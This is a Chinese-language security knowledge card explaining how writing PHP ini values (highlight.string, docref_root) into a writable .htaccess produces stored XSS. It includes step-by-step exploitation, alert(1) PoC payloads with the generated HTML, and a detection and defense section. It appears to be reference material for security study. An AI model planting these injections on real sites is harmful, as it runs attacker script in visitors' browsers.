---
id: web-generic-xss-php-config-highlight-docref
title: .htaccess 注入 highlight.string / docref_root 配置造成 XSS
type: scenario
domain: web
path: web/generic/xss
technique: php-config-injection-xss
aliases:
- highlight.string XSS
- docref_root XSS
- PHP 配置注入 XSS
- highlight_file 颜色注入
- 报错超链接注入
tags:
- web
- php
- apache
- htaccess
- xss
- config-injection
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:38:55+08:00'
  notes: 已对照原文与图25-29核对：PHP 文档确认 highlight.string 可被设为 <font color="..."> 中任意内容、docref_root 用于错误信息函数链接；图26 为 highlight.string 注入后弹窗，图28/29 为 display_errors/html_errors + docref_root 注入后弹窗；卡片两种 PoC 与原文一致。原文测试环境 PHP 8.5.0RC3/Apache 2.4.65，非受影响区间，未设置 versions。PoC 未在本机执行。
---

## 一句话结论

PHP 会把若干 ini 配置值直接拼进生成的 HTML：`highlight.string` 进入 `<font color="...">`，`docref_root` 进入错误信息的 `<a href="...">`。通过 `.htaccess` 的 `php_value` 注入 `"><script>...` 等值，即可在页面/报错中触发 XSS。

## 原理

- `highlight_file()`/`show_source()`/`highlight_string()` 用 `highlight.*` 系列 ini 作为高亮颜色，PHP 直接把它们写入 `<font color="VALUE">` 或 `<span style="color: VALUE">`，不做 HTML 属性转义。把 `highlight.string` 设为 `"><script>alert(1);</script>` 会提前闭合 color 属性并插入脚本。
- 开启 `display_errors` 与 `html_errors` 后，PHP 把报错中的函数名渲染成指向手册的链接 `<a href="{docref_root}function.include">`。`docref_root` 可控时，注入 `'><script>alert(1);</script>` 会闭合 href 并执行脚本。报错须由内置函数引起且不能是 fatal error。
- `highlight.string`、`docref_root`、`html_errors`/`display_errors` 均属可被 `.htaccess` 覆盖的级别（`PHP_INI_ALL`/`PHP_INI_PERDIR` 视项而定），因此可写 `.htaccess` 即可全局注入。
- 这类 XSS 不需要应用回显攻击者输入，属于“配置层持久型注入”，对所有访问该目录、触发高亮或报错的用户生效。

## 触发条件

- Apache + mod_php，`.htaccess` 可写且 `AllowOverride` 允许相应指令；
- 页面调用 `highlight_file`/`highlight_string`/`show_source`，或开启了 `display_errors` 与 `html_errors` 并会触发内置函数报错；
- 受害者访问该页面；无需用户交互即可触发（配置已生效）。

## 利用步骤

1. 确认可写 `.htaccess` 且 PHP 配置可被覆盖。
2. 场景 A：页面高亮源码时，注入 `highlight.string`。
3. 场景 B：注入 `docref_root` 并开启 `display_errors`/`html_errors`，构造一个内置函数警告（如 include 不存在的文件）。
4. 访问页面或错误路径，脚本在响应 HTML 中执行。

## PoC

场景 A：

```apache
php_value highlight.string '"><script>alert(1);</script>'
```

目标页面：

```php
<?php highlight_file(__FILE__); ?>
```

响应中生成：

```html
<font color=""><script>alert(1);</script>">...</font>
```

场景 B：

```apache
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```

触发：

```php
<?php include('not_exist_file'); ?>
```

报错中生成：

```html
<a href=''><script>alert(1);</script>function.include'>function.include</a>
```

## 变体与关联

- 其他可注入的 ini：`highlight.comment`、`highlight.keyword`、`highlight.html`、`highlight.default`、`highlight.bg` 等；`error_prepend_string`/`error_append_string` 也能注入 HTML。
- 与 `docref_ext` 组合可控制链接后缀；`html_errors=Off` 则错误输出纯文本，不能注入。
- 关联：`.htaccess` 配置滥用族（handler 覆盖、auto_prepend、pcre 限制）；XSS 的其他服务端配置来源（CRLF 头注入）。
- 边界：页面未调用高亮函数且无报错时，仅改配置不会触发；`AllowOverride None` 不可用；CSP 可能阻止内联脚本。

## 检测与防御

- 生产环境 `AllowOverride None`，禁止上传 `.htaccess`；监控 `.htaccess` 中的 `highlight.*`、`docref_root`、`display_errors`、`html_errors`。
- 不要在页面中使用 `highlight_file`/`show_source` 显示源码；错误详情只在开发环境开启，生产关闭 `display_errors`。
- 输出 HTML 时对配置派生值做属性转义；设置严格 CSP 阻止内联脚本。
- 代码审计搜索 `highlight_file(`、`show_source(` 与 `ini_set('highlight`/`docref` 的可控路径。
